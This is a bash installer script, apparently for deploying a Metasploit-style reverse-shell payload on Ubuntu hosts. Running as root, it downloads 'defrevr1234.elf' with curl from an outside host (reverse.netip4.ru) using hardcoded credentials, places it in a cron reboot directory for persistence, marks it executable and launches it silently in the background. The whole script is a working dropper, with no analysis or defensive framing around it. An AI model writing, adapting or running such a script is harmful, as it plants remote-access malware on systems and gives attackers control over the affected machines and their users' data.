#!/usr/bin/env bash
####
# msf.l.install.sh
# This Script will Install and Run msf script with Cron Daemon
# PARAMETERS:	NONE
# RETURN:	0 if Success
#		1 if Error Occur
#		17 if non-root privileges
####

# Set a Variables

### Set Metadata ###
#

PACKAGES_DIR=packages
PRODUCT_FOLD=ComFiles
DISTRIB=UBUNTU
PRODUCTNAME=BHSH
SUBPRODUCTNAME=msf.r.install
FIRM_NAME=NIT

# Check if script run at root mode
#

if [ $EUID -ne 0 ]; then
	echo "ERROR: process must be start with root permissions"
	exit 17
fi

### Set an NIT Users Variable ###
#
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

### Check Common TPDL Folder

TPDL=/var/share/tmp
if [ ! -d $TPDL ]; then
    echo "Directory $TPDL is not found!"
    exit 1
fi

#### Set Execution Folder
##
REBOOTDIR=/etc/cron.$FIRM_NAME.rebootdir

### Set a Payload program ###
#
aPayloadSource=defrevr1234.elf
aPayloadDest=defrevr1234_elf

# Initialization Download Variables
#
http_pref001=http
http_host001=file.netip4.ru
http_port001=80
http_dir0001=/LINUXSCRIPTS
http_dir0002=/ExponentaForDebian
http_dir0003=$http_dir0001/$DISTRIB/$FIRM_NAME/$PRODUCTNAME/$SUBPRODUCTNAME
http_pref002=http
http_host002=reverse.netip4.ru
http_port002=80
http_dir00000=/tmp/LinFiles
http_dir00001=/tmp/LinFiles/$PRODUCT_FOLD
http_user001=MSSQLSR
http_pass001=Admin01234


# Derivatives Variables
host=$http_pref002://$http_host002:$http_port002$http_dir00001/$SUBPRODUCTNAME/$aPayloadSource
localFile=$REBOOTDIR/$aPayloadDest
echo "host = $host"
echo "localfile = $localFile"
#

echo "### Check System Integrity ###"
###
if [ ! -e /usr/bin/curl ]; then
    echo "/usr/bin/curl is not found. Installation is aborted"
    exit 1
fi

if [ ! -e /usr/bin/killall ]; then
    echo "/usr/bin/killall is not found. Installation is aborted"
    exit 1
fi

### Delete Payload
##
if [ -d $REBOOTDIR ];  then
    echo "Try to kill & delete the Payload $aPayloadDest..."
    if [ $(pidof $aPayloadDest) ]; then
        /usr/bin/killall $aPayloadDest
    fi
    if [ -f $localFile ]; then
        rm -v $localFile
    fi
fi

### Run Payloads
##
if [ -d $REBOOTDIR ];  then
    echo "Try to Download and Execute file $aPayloadSource..."
    if [ ! -e $localFile ]; then
        /usr/bin/curl -o $localFile $host -u $http_user001:$http_pass001 --verbose
        chmod -v +x $localFile
    fi
    if [ ! $(pidof $aPayloadDest) ]; then
        $localFile 2> /dev/null > /dev/null &
    fi
fi



echo "The End of the Script $0 with Success"
exit 0
